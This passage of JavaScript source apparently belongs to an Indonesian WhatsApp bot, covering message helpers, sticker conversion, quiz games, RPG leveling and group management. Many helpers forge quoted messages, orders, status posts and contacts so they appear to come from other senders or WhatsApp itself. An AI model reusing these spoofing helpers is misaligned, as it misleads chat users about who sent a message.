        : itsmevall.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };   
// Fake Reply Bang:)
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289503657396-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: iye,
          surface: 200,
          message: iye,
          orderTitle: "Realzibot.",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./itsmevall.jpg')
        }}}
const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '1595603042@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
}
 const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./media/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 800000,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: iye, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const ftroli2 = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 800000,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: fake, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6289503657396-1616169743@g.us",
			"inviteCode": `${ucapanWaktu} ${pushname}`,
			"groupName": `${ucapanWaktu} ${pushname}`, 
            "caption": `${ucapanWaktu} ${pushname}`, 
            'jpegThumbnail': fake
		}
	}
}
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `16505434800@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289503657396-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 999999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289503657396-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289503657396-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf",
		"pngThumbnail": iye,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "0418",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// STICKER

    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6289503657396-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `6289503657396@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289503657396-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${ucapanWaktu} ${pushname}`,
                 "h": `${ucapanWaktu} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
                       }
	                  }
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289503657396-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${ucapanWaktu} ${pushname}`,
                 "title": `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
	                  } 
                     }
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      itsmevall.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./media/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      itsmevall.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./media/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
            itsmevall.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": "REALZIBOT",
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./media/thumb.jpeg`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
itsmevall.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
	   global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
        if (json[2][0][1].live == 'true') charging = true
       if (json[2][0][1].live == 'false') charging = false
        console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel+'%')
	})
	global.batrei = global.batrei ? global.batrei : []
		itsmevall.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
		}) 
download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            itsmevall.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };    
if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    itsmevall.sendMessage(from, teks, text, {quoted:mek})
}          /*if (!mek.key.fromMe && banChats === false) return*/
	              
           
const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
        }
const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, './sticker' + names + '.png', async function () {
           console.log('selesai');
           let filess = './sticker' + names + '.png'
           let asw = './sticker' + names + '.webp'
           exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
           fs.unlinkSync(filess)
           if (err) return reply(`${err}`)
           exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
           if (error) return reply(`${error}`)
           itsmevall.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:mann})
           fs.unlinkSync(asw)
});
});
});
}        
   
//******************* 》banchat《 ********************\\
if (isBanchat){
if (!itsMe && !isOwner)return 
}
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./media/thumb.jpeg`), //Gambarnye
            },
            title: "FakeReply Bang", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "ItsMeVall",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
/// VIEW ONCE VID
const foncevid = { 
key: {fromMe: false, remoteJid: "6281315995629@g.us", participant: '0@s.whatsapp.net'}, 
message: { 
  videoMessage: { 
  viewOnce: true
},
},
    };    
 const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": iye //Gambarnye
					},
					"title": `${ucapanWaktu} ${pushname}`, //Kasih namalu 
					"description": `${ucapanWaktu} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${ucapanWaktu} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        itsmevall.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
// GAME 
            if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmu = randomNomor(100)
                    atm.addKoinUser(sender, htgmu, _uang)
                    await reply(`*_🎮 Tebak Anime 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakanime*`)
                    delete tebakanime[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                }
            }
            if (tebaklagu.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklagu[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpl = randomNomor(100)
                    atm.addKoinUser(sender, htpl, _uang)
                    await reply(`*_🎮 Tebak Lagu 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpl} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklagu*`)
                    delete tebaklagu[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
                }
            }
            if (tebaktebakan.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaktebakan[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpu = randomNomor(100)
                    atm.addKoinUser(sender, htpu, _uang)
                    await reply(`*_🎮 Tebak Tebakan 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaktebakan*`)
                    delete tebaktebakan[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))                    
                }
            }
            if (kuismath.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = kuismath[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htcc = randomNomor(100)
                    atm.addKoinUser(sender, htcc, _uang)
                    await reply(`*_🎮 Kuis Matematika  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}kuismath*`)
                    delete kuismath[sender.split('@')[0]]
                    fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
                }
            }
          if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = asahotak[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgm = randomNomor(100)
                    atm.addKoinUser(sender, htgm, _uang)
                    await reply(`*_🎮 Asah Otak  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgm} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`)
                    delete asahotak[sender.split('@')[0]]
                    fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
                }
            }
          if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmi = randomNomor(100)
                    atm.addKoinUser(sender, htgmi, _uang)
                    await reply(`*_🎮 Caklontong  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmi} 💰_\n\nIngin bermain lagi? kirim *${prefix}caklontong*`)
                    delete caklontong[sender.split('@')[0]]
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                }
            }
          if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakjenaka[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmuu = randomNomor(100)
                    atm.addKoinUser(sender, htgmuu, _uang)
                    await reply(`*_🎮 Tebak Jenaka  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmuu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`)
                    delete tebakjenaka[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
                }
            }
            if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklirik[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmii = randomNomor(100)
                    atm.addKoinUser(sender, htgmii, _uang)
                    await reply(`*_🎮 Tebak Lirik 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmii} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklirik*`)
                    delete tebaklirik[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
                }
            }
            if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakimia[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmcc = randomNomor(100)
                    atm.addKoinUser(sender, htgmcc, _uang)
                    await reply(`*_?? Tebak Kimia 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`)
                    delete tebakimia[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
                }
            }
          if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaksiapaaku[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmk = randomNomor(100)
                    atm.addKoinUser(sender, htgmk, _uang)
                    await reply(`*_🎮 Tebak Siapakah Aku  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaksiapaaku*`)
                    delete tebaksiapaaku[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
                }
            }
          if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakbendera[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var html = randomNomor(100)
                    atm.addKoinUser(sender, html, _uang)
                    await reply(`*_🎮 Tebak Bendera  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${html} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakbendera*`)
                    delete tebakbendera[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
                }
            }
          if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = susunkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmp = randomNomor(100)
                    atm.addKoinUser(sender, htmp, _uang)
                    await reply(`*_🎮 Susun Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmp} 💰_\n\nIngin bermain lagi? kirim *${prefix}susunkata*`)
                    delete susunkata[sender.split('@')[0]]
                    fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
                }
            }
          if (tebakata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmu = randomNomor(100)
                    atm.addKoinUser(sender, htmu, _uang)
                    await reply(`*_🎮 Tebak Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkata*`)
                    delete tebakata[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
                }
            }
                        
//function check healt
          const checkHealt = (sender) => {
          	let found = false
                    for (let lmt of _healt) {
                        if (lmt.id === sender) {
                            const healthCounts = healtawal - lmt.healt
                            if (healthCounts <= 0) return itsmevall.sendMessage(from,`Limit request anda sudah habis\n\n_Note : Limit akan direset setiap jam 21:00!_`, text,{ quoted: mek})
                          //  zee.sendMessage(from, `${healthCounts}`, text, { quoted : mek})
                           if (!isPetualang) return reply(mess.only.player)
 reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
pp = monospace(`📍 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗣𝗹𝗮𝘆𝗲𝗿
 • Nama : ${pushname}
 • Rank : ${role}
 • Uang : $${(getBalance(sender, balance))}
 • Xp : ${xp}Xp
 • Level : ${getLevelingLevel(sender)}
 
🎒 𝗜𝗻𝘃𝗲𝗻𝘁𝗼𝗿𝗶 :
 • Uang : $${(getBalance(sender, balance))}💰
 • Emas : ${getEmas(sender)}🪙
 • Besi : ${getBesi(sender)}⛓️
 • Berlian : ${getDm(sender)}💎
 • Ikan : ${getFish(sender)}🎣

🏔️ 𝗠𝗲𝗻𝘂 𝗥𝗣𝗚
 • joinrpg
 • quest ( otw )
 • mining
 • mancing
 • adventure
 • myinventori
 • topleaderboard
 
🛒 𝗦𝗲𝗹𝗹 𝗜𝗻𝘃𝗲𝗻𝘁𝗼𝗿𝘆
 • sellikan
 • sellbesi
 • sellemas
 • selldiamond`)
		  but = [{ buttonId: `menu`, buttonText: { displayText: 'Back To Menu' }, type: 1 }]
          sendButMessage(from, pp, 'rpg game', but)
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, healt: 1 }
                        _healt.push(obj)
                        fs.writeFileSync('./lib/healt.json', JSON.stringify(_healt))
                        itsmevall.sendMessage(from, `${healthCounts}`, text, { quoted : mek})
                    }
				}				
            //function rank 
			const levelRole = getLevelingLevel(sender)
   	     var role = 'bronz'
   	     if (levelRole <= 3) {
   	         role = 'Copper'
   	     } else if (levelRole <= 5) {
   	         role = 'Iron'
   	     } else if (levelRole <= 7) {
   	         role = 'Silver'
   	     } else if (levelRole <= 10) {
   	         role = 'Gold'
   	     } else if (levelRole <= 12) {
   	         role = 'Platinum'
   	     } else if (levelRole <= 15) {
   	         role = 'Mithril'
   	     } else if (levelRole <= 18) {
   	         role = 'Orichalcum'
   	     } else if (levelRole <= 25) {
   	         role = 'Adamantite'
   	     }
   	     
   	     //function leveling
            if (isGroup && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 100
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                var getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                addLevelingLevel(sender, 1)   
                var lvlup = monospace(`╭───「 Level Up 」
│
├ • Nama : ${pushname}
├ • Rank : ${role}
├ • Xp : ${getLevelingXp(sender)}
├ • Level : ${getLevelingLevel(sender)}
│
╰───「 Omedeto 」`)
		  but = [{ buttonId: `!menu`, buttonText: { displayText: 'Back To Menu' }, type: 1 }]
          sendButMessage(from, lvlup, 'Level Up', but)

                }
            } catch (err) {
                console.error(err)
            }
        }
            // Kalo Make Kasi WM Made By Febriansyah Ajg!!          

        var ikan = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐡','🐙']
        var hewan = ['🐔','🦃','🦆','🐐','🐏','🐖','🐑','🐎','🐺']
        var burung = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
                

///Button Text

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
itsmevall.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await itsmevall.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await itsmevall.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//Button ocument
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await itsmevall.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await itsmevall.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
const nebal = (angka) => {
            return Math.floor(angka)
        }
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        itsmevall.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      itsmevall.groupAdd(from, orangnya);
    };
        const grupinv = (teks) => {
        	grup = itsmevall.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `[©Apriliya✓Chan]`, "footerText": "*_© Dcode Denpa_*", "jpegThumbnail": iye, "caption": teks}}, {quoted:mek})
            itsmevall.relayWAMessage(grup)
        }
const fakeitem = (teks) => {
            itsmevall.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`./media/thumb.jpeg`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`ItsMeVall`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}                    
// Reply
const reply = (teks) => {
      itsmevall.sendMessage(from, teks, text, { quoted: mek, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true});
    };
const fakelinkk = (teks) => {        
itsmevall.sendMessage(from, teks, text, { thumbnail: ofrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/6285815700875?text=Assalamualaikum`}}})
		}
const fakelink = (teks) => {
itsmevall.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
